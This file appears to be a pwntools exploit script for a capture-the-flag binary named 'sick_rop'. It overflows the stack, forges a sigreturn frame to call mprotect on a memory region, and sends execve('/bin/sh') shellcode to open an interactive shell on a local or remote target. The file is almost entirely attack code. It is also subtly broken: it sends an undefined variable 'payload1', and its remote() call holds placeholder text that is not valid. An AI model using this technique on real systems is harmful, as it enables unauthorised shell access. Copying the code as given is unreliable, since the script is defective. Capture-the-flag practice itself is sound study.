from pwn import *
context.clear(arch='amd64')

p = process("./sick_rop")
p = remote("*IP Address*" , port number)

shellcode = (b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05") # 23B // From shellstrorm

syscall = 0x401014

vuln_function  = p64(0x40102e)
vuln_pointer = 0x4010d8

writable = 0x400000

frame = SigreturnFrame(kernel="amd64")
frame.rax = 10 #Mprotect for syscall table
frame.rdi = writable #Writable memory segment
frame.rsi = 0x4000 #Size
frame.rdx = 7 #Read/Write/Exectable access
frame.rsp = vuln_pointer #Why not vuln function but a pointer to vuln?
frame.rip = syscall #Calling the syscall in the end

payload = b"A"*40 + vuln_function + p64(syscall) + bytes(frame)

p.sendline(payload1)
p.recv()

#gdb.attach(p)

payload = b"C"*15
p.send(payload)
p.recv()

payload3 = shellcode + b"\x90"*17 + p64(0x00000000004010b8)

p.send(payload3)
p.recv()

# gdb.attach(p)

p.interactive()
